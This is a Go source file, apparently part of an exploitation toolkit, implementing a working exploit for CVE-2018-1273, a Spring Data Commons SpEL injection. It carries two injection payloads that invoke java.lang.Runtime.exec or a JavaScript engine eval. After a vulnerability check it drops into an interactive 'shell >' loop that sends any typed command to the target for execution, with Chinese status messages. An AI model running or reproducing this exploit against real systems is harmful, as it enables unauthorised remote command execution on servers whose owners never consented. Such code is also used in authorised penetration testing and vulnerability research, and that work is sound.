package exppackage

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"os"
	"ssp/common"
	"strings"
)

func CVE_2018_1273(url string, proxyURL string) {

	oldHeaders := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers := common.MergeHeaders(oldHeaders)

	path1 := "users"
	path2 := "users?page=0&size=5"

	payload1 := "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
	payload2 := "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")]=asdf"

	urlTest1 := url + path1
	urlTest2 := url + path2

	// 使用 MakeRequest 替换 GET 请求部分
	resp1, body, err := common.MakeRequest(urlTest1, "GET", proxyURL, headers, "")
	if err != nil {
		color.Yellow("[-] %s 请求失败，跳过漏洞检查\n", url)
		return
	}

	// 检查响应
	code1 := resp1.StatusCode
	if code1 == 200 && strings.Contains(string(body), "Users") {
		common.PrintVulnerabilityConfirmation("CVE-2018-1273", url, "存在漏洞,由于该漏洞无回显，请用Dnslog进行测试", "1")
		fmt.Print("[+] 两种Payload，请输入1或者2: ")

		var choose string
		fmt.Scanln(&choose)

		for {
			fmt.Print("shell > ")
			reader := bufio.NewReader(os.Stdin)
			command, _ := reader.ReadString('\n')
			command = strings.TrimSpace(command)

			if command == "exit" {
				os.Exit(0)
			}

			var payload string
			if choose == "1" {
				payload = fmt.Sprintf(payload1, command)
			} else {
				payload = fmt.Sprintf(payload2, command)
			}

			_, _, err := common.MakeRequest(urlTest2, "POST", proxyURL, headers, payload)
			if err != nil {
				fmt.Println("[-] 发生错误:", err)
				return
			}

			color.Green("[+] 命令已执行：%s\n", command)
		}
	} else {
		color.Yellow("[-] %s 未发现CVE-2018-1273远程命令执行漏洞\n", url)
	}
}
